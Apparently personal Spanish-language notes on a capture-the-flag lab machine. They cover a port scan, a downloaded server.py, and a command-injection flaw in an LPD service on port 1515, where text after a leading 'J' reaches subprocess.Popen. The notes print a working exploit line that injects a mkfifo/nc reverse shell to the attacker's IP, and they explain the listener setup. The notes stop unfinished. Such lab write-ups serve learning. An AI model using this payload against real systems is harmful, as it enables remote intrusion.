Hacemos un escaneo con nmap y encontramos 3 puertos.
![[Pasted image 20260712193144.png]]
Puerto 22 ssh
Puerto 80 http
Puerto 
Uno http y vemos que dentro del http hay un archivo lo descargamos lo unzipeamos y vemos un server.py dentro de eso podemos ver una vulnerabilidad  

![[Pasted image 20260712193106.png]]
![[Pasted image 20260712193033.png]]

Ahora queremos iniciar conexión a la máquina entonces tenemos que usar un netcat

```bash
nc IP_DESTINO PUERTO
```

Sin `-l` (porque no estás escuchando, estás **iniciando** la conexión hacia el servidor LPD que corre en la máquina víctima, puerto 1515).

Una vez conectado así, cualquier texto que escribas en tu terminal se **manda** directamente al servidor — es literalmente un canal de texto en bruto hacia ese puerto.

### Sobre lo de la "J"

Recuerda el código que leíste:

python

```python
if line.startswith('J'):
    job_name = line[1:]
```

Esto significa: el servidor lee lo que le mandas **línea por línea**, y si una línea **empieza por la letra `J`**, todo lo que venga **después de esa J** (por eso `line[1:]`, "desde el carácter 1 en adelante", saltándose la J) se convierte en el valor de `job_name` — la variable que luego se mete sin protección en el comando del sistema.

Así que si tú, conectado con `nc` al servidor, escribes literalmente esta línea:

```
Jtest; comando_que_quieras
```

El servidor interpreta: "ah, empieza por J, así que `job_name` = `test; comando_que_quieras`" — y ese valor completo se cuela en el `subprocess.Popen(...)`.

### Juntando todo

1. Conéctate con `nc` (modo cliente) al puerto 1515 de la víctima
2. Escribe una línea que empiece por `J`, seguida de tu payload de reverse shell

![[Pasted image 20260712195544.png]]


Necesitas mandar, **antes** de tu línea de texto, ese byte especial con valor `2`. Con `nc` normal esto es un poco incómodo (porque `2` como carácter de teclado no es lo mismo que el byte numérico 2), pero se puede hacer así, usando `printf` para construir los bytes exactos y canalizándolo a `nc`:

bash

```bash
printf '\x02Jtest; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.170 4444 >/tmp/f\n' | nc 10.129.51.141 1515
```

**Desglose**: `\x02` es la forma de escribir "el byte con valor 2" en `printf` — así mandamos exactamente lo que el servidor espera como primer byte, seguido inmediatamente de tu línea `J...` con el payload.
### Las dos terminales tienen dos trabajos completamente distintos

**Terminal 1 — El listener (`nc -lvnp 4444`)**  
Esta terminal se queda **esperando pasivamente**. Su único trabajo es: "si alguien se conecta a mi puerto 4444, dame el control de esa conexión". No hace nada activo — solo espera.

**Terminal 2 — La conexión al servidor LPD (`nc 10.129.51.141 1515`)**  
Esta terminal es la que **tú usas activamente** para mandar el payload malicioso al servidor vulnerable de la víctima (puerto 1515). Es el "disparador" del ataque.


- **Terminal 1**: `nc -lvnp 4444` (escuchando, quieta)
- **Terminal 2**: ejecutas `nc 10.129.51.141 1515` — esto abre la conexión y tu terminal se queda "colgada" esperando (sin volver al prompt normal)
- **En esa misma Terminal 2**, justo debajo, sin cerrar nada, escribes/pegas la línea del payload y pulsas Enter


CONTINUAR LA MÁQUINA MÁS ADELANTE 